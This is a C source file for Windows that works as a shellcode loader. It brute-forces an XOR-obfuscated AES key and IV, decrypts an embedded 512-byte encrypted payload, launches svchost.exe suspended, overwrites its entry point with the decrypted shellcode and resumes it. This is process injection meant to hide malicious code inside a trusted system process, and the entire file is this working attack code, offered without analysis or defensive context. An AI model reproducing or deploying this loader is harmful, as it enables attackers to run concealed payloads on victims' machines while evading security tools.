#include <windows.h>
#include <stdio.h>
#include "CtAes.h"

unsigned char AesKey[32] =
"\xe4\x90\xf7\x5f\x97\x46\x5c\xce\x0d\xfb\x3b\x16\x88\xb4\x1f\xb1"
"\x07\x68\xc2\x10\xd3\xce\xc6\x29\x8a\xda\xee\x37\x59\x1f\x6d\x74";

unsigned char AesIv[16] =
"\xcc\xa3\xee\x5f\x9d\xd2\xdd\x3d\x6d\xd5\xbe\x23\x0e\x3d\xe6\x68";

unsigned char Shellcode[512] =
"\xfe\x6c\x7b\x25\x9a\xcb\xa4\xb5\xb5\x1c\xd5\x40\xb1\x6e\x67\xd6"
"\x01\x91\x3f\xf6\x96\xb1\x84\xe7\x6c\xc7\xe9\xfd\xaa\x98\x07\xf4"
"\x81\xf4\x7f\xda\xe5\x33\x10\x7b\x5a\x9b\x83\x29\x81\x5c\xf5\xd7"
"\x8a\x82\xc7\xff\x53\x60\x0f\x7f\x05\x03\x0a\x8c\x65\xc7\x2a\xa1"
"\x61\xb1\xd1\x57\x62\x91\x2b\xa3\xf9\x3f\x14\x65\x30\x9c\x72\x8c"
"\xc2\x71\x5c\x4c\x6b\x35\xb4\x95\xae\x9c\xe3\x96\x27\xb6\xea\xc2"
"\x4d\x93\xc4\xcf\xdf\xa1\xff\x68\xb7\xdc\x20\xbc\x29\x6a\x5c\xcf"
"\x53\x81\x47\x6b\x99\xca\xa2\xc4\x92\x46\xdd\x2b\x62\x3e\xff\x03"
"\x72\xe0\xbc\xf5\x70\xdd\xc3\x8f\xc7\xf6\x0c\x6b\xed\xef\xf1\xa1"
"\x3e\x02\xb3\x9c\x3b\xbb\xee\x11\x49\x5c\x04\xe2\x31\x1b\x56\x8f"
"\x2f\x03\x32\xb2\x9d\x4c\x68\x54\x4f\x0c\xec\x96\x29\x4b\x85\xb3"
"\xbb\x77\xeb\x6a\xac\x54\x57\x29\x60\xbd\x6e\x5b\x81\x6f\xfc\x4e"
"\x85\x89\xf9\x75\x96\xe7\x4e\x31\xb4\x30\x4a\xed\x68\x46\x70\x4e"
"\x63\x6f\x66\x5d\xe0\x24\xce\x89\x94\x99\x9c\x7e\xab\x16\x52\xbe"
"\x32\x8c\x05\xf0\xe5\x62\xb4\xbf\xb2\x65\xb7\x49\x42\x96\xb0\x1d"
"\x4b\xeb\x5f\x36\x8e\x7e\x35\xb8\xda\x97\xb5\x48\xa2\xe6\x14\x6e"
"\x4e\x07\x15\x9a\x9d\xcb\xac\x33\x20\xd1\x64\x92\x9b\x13\x14\x5d"
"\xe8\x26\xa7\x19\xdf\x00\xce\x5d\xaa\xc4\xe9\xe6\x73\x1a\x26\x88"
"\x6b\x28\x85\x82\x50\xe6\xd7\x02\xa0\x41\xc4\x01\x78\xbb\x72\x56"
"\x90\x3b\x09\x67\x7b\xd1\x78\x95\xef\xdf\x36\x2d\x94\x09\x7b\x9e"
"\x77\x69\x5e\x94\x73\x7a\xe7\x59\xf9\xd8\xff\x97\x12\xad\xb0\xf8"
"\xc3\xfd\x61\x8a\x04\x73\x22\x00\x49\x31\xd6\x3a\xf1\x3c\x06\xaf"
"\x91\xf1\x8e\x18\x44\x54\x20\x43\x59\x16\xe6\x09\xe7\x16\x6d\x9a"
"\x07\x32\xd8\x96\x54\x28\x57\xe7\x85\x98\x82\x95\x9b\x7d\xcb\x91"
"\xb9\x59\x8e\x60\xe3\x99\xa7\x11\xa2\x65\x5f\xb2\xc8\x76\x0b\x96"
"\x26\xa6\xfe\x8b\x97\x7f\xc2\x12\xc2\xfb\x8f\xda\xa8\xc7\x79\xf1"
"\x52\x12\xee\x7a\x70\x60\x8e\x9c\x6d\x9b\x61\x32\x86\x78\x79\xf6"
"\xd7\x73\x73\x16\xab\xaa\x87\x1a\x04\x94\xab\xd8\xc5\x69\xab\x6c"
"\x87\x3f\x3d\x69\x46\x17\xb1\x93\x36\xcf\xa6\x8b\xea\x63\xab\xe6"
"\xcb\xd3\x7d\x89\xb7\x18\xb5\xbb\x8a\x36\x31\xb6\x24\x01\xfd\x60"
"\xa5\x5c\x26\xe8\xce\x9f\xa1\x8d\xed\x89\xcc\xec\x52\xa0\x82\x33"
"\x0d\xdf\xe0\x75\x6c\x9b\x1d\x08\xf3\xb9\x92\x8b\x8f\x33\xcf\x59";

BYTE BruteForceDecryptionKey(IN PBYTE pKeyArray, IN SIZE_T sKeySize) {
    int i = 0x00;
    for (i = 0; i <= 0xFF; i++) {
        if (((pKeyArray[1] ^ i) % 0xFF) == 0x6B) {
            break;
        }
    }

    for (int x = 0; x < sKeySize; x++)
        pKeyArray[x] = pKeyArray[x] ^ i;
    return i;
}

BYTE BruteForceDecryptionIv(IN PBYTE pKeyArray, IN SIZE_T sKeySize) {
    int i = 0x00;
    for (i = 0; i <= 0xFF; i++) {
        if (((pKeyArray[1] ^ i) % 0xFF) == 0x42) {
            break;
        }
    }

    for (int x = 0; x < sKeySize; x++)
        pKeyArray[x] = pKeyArray[x] ^ i;
    return i;
}

BOOL InstallAesDecryptionViaCtAes(IN PBYTE pCipherTextBuffer, IN SIZE_T sCipherTextSize, IN PBYTE pAesKey, IN PBYTE pAesIv, OUT PBYTE* ppPlainTextBuffer, OUT SIZE_T* pPlainTextSize) {

    AES256_CBC_ctx	AesCtx = { 0x00 };

    if (!pCipherTextBuffer || !sCipherTextSize || !ppPlainTextBuffer || !pAesKey || !pAesIv)
        return FALSE;

    if (!(*ppPlainTextBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sCipherTextSize))) {
        printf("[!] HeapAlloc Failed With Error: %d \n", GetLastError());
        return FALSE;
    }

    RtlSecureZeroMemory(&AesCtx, sizeof(AES256_CBC_ctx));
    AES256_CBC_init(&AesCtx, pAesKey, pAesIv);
    AES256_CBC_decrypt(&AesCtx, (sCipherTextSize / 16), *ppPlainTextBuffer, pCipherTextBuffer);

    *pPlainTextSize = sCipherTextSize;

    return TRUE;
}

int main() {

    // 1
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    CONTEXT context;
    SIZE_T dwRead = 0;
    IMAGE_DOS_HEADER dosHeader;
    IMAGE_NT_HEADERS peHeader;
    ULONG_PTR pBaseAddress = 0;
    SIZE_T numBytesWritten = 0;
    context.ContextFlags = CONTEXT_FULL;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    PBYTE DecryptedShellcode = NULL;
    SIZE_T DecryptedSize = 0;

    BruteForceDecryptionKey(AesKey, 32);
    BruteForceDecryptionIv(AesIv, 16);

    InstallAesDecryptionViaCtAes(Shellcode, 512, AesKey, AesIv, &DecryptedShellcode, &DecryptedSize);

    // 2
    CreateProcessW(L"C:\\Windows\\System32\\svchost.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    // 3
    GetThreadContext(pi.hThread, &context);
    // 4
    ReadProcessMemory(pi.hProcess, (LPCVOID)(context.Rdx + (sizeof(ULONG_PTR) * 2)), &pBaseAddress, sizeof(pBaseAddress), &dwRead);
    // 5
    ReadProcessMemory(pi.hProcess, (LPCVOID)pBaseAddress, &dosHeader, sizeof(dosHeader), &dwRead);
    // 6
    ReadProcessMemory(pi.hProcess, (LPCVOID)((BYTE*)pBaseAddress + dosHeader.e_lfanew), &peHeader, sizeof(peHeader), &dwRead);
    // 7
    LPVOID entryPoint = (LPVOID)((BYTE*)pBaseAddress + peHeader.OptionalHeader.AddressOfEntryPoint);
    // 8
    WriteProcessMemory(pi.hProcess, entryPoint, DecryptedShellcode, DecryptedSize, &numBytesWritten);
    //9
    ResumeThread(pi.hThread);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}